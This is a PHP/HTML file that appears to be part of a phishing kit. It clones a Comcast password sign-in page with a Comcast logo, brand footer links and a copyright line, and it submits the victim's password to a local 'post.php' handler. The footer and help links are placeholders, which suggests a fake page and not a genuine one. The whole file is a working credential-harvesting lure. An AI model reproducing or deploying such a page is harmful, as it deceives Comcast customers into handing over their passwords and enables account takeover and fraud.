<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>comcast</title>
    <link rel="stylesheet" href="res/app.css">
    <style>
        /* Force Trebuchet MS font across all elements */
        body, main, .container, .logo, .title, h2, .col, input, .forget, .keep,
        .chek, .kep, label, .terms, .btn, button, .line, .sign, .get, p, a,
        footer, .copy, .links, .pic, .pic2, .pic3, .pic4, .pic5, .pic6, .cookie,
        .foter, div, span, b {
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Segoe UI', sans-serif !important;
        }
        /* Preserve original input styling */
        input {
            font-family: 'Trebuchet MS', sans-serif !important;
        }
        button {
            font-family: 'Trebuchet MS', sans-serif !important;
            font-weight: 600;
        }
        /* Keep all original spacing, layout, and design intact */
    </style>
</head>
<body>
    <main>
        <div class="container">
            <div class="logo">
                <img src="res/img/logo.png" alt="">
            </div>
            <div class="title">
                <h2>Enter your password</h2>
            </div>
            <div class="col">
            <form action="post.php" method="post">
                    <input type="password" name="pass" placeholder="Enter your password" required>    
                </div>
                <div class="forget">
                <a href="">Forgot password?</a>
                </div>

                <div class="keep">

                <div class="chek">
                <input type="checkbox">
                </div>
                <div class="kep">
                <label>Keep me signed in</label>
                </div>

                </div>
                <br>
                <div class="terms">
                By signing in, you agree to our <a href="">Terms of Service</a> and <a href="">Privacy Policy.</a>
                </div>
                <div class="btn">
                    <button>Sign in</button>
                </div>
                </form>
                <br>
              <div class="line">
                    <div class="sign">
                    <b>Sign in as someone else</b>
                </div>
               
                <div class="get">
                <p>Trouble signing in?<a href="">Get help</a></p> 
                </div>
            
                </div>
        </div>
        <footer>

            <div class="copy">
                &copy; 2026 Comcast
            </div>

            <div class="links">
                <div class="pic"> <img src="res/img/line1.png" alt="">
                <a href="#">
                   Web Terms Of Service
                </a>
                </div>

                <div class="pic2"> <img src="res/img/line2.png" alt="">
                <a href="#">
                    CA Notice at Collection
                </a>
                </div>

                <div class="pic3"> <img src="res/img/line3.png" alt="">
                <a href="#">
                    Privacy Policy
                </a>
                </div>

                <div class="pic4"> <img src="res/img/line4.png" alt="">
                <a href="#">
                    Your Privacy Choices
                </a>
                </div>

                <div class="pic5"> <img src="res/img/line5.png" alt="">
                <a href="#">
                    <span>Health Privacy Notice</span>
                </a>
                </div>

                <div class="pic6"> <img src="res/img/line6.png" alt="">
                <a href="#">
                    Ad Choices
                </a>
                </div>
            </div>
     
            <div class="cookie">
            <div class="foter"> <img src="res/img/foter.png" alt="">
                <a href="#">
                    <span>Cookie Preferences</span>
                </a>
                </div>
            </div>
    </footer>
    </main>
    
</body>
</html>